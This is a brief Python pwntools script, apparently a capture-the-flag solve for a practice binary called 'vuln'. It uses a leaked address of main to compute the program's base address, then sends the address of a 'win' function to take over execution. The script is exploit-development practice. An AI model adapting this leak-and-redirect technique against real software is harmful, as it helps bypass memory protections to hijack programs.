from pwn import *

elf = context.binary = ELF("./vuln", checksec=False)

p = process("./vuln")
addrOfMain = int(p.recvline().decode().strip().split(" ")[3], 16)
print(addrOfMain)

offset_main = 0x000000000000133d
base_addr = addrOfMain - offset_main
print(hex(base_addr))

win_addr = elf.sym['win']

win_func = base_addr + win_addr
print(hex(win_func))
p.recvuntil(b"45:")

p.sendline(hex(win_func))

resp = p.recvall()
print(resp.decode())


